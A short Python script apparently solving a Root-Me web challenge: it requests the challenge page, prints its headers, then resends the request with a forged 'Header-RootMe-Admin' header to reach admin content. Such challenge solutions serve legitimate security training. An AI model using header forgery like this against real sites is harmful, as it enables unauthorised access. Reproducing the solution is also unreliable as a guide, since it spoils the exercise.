import requests

url = 'http://challenge01.root-me.org/web-serveur/ch5/'
r = requests.get(url)
print(r.headers)
headers = {'Header-RootMe-Admin': 'none'}
r = requests.get(url, headers=headers)
print(r.text)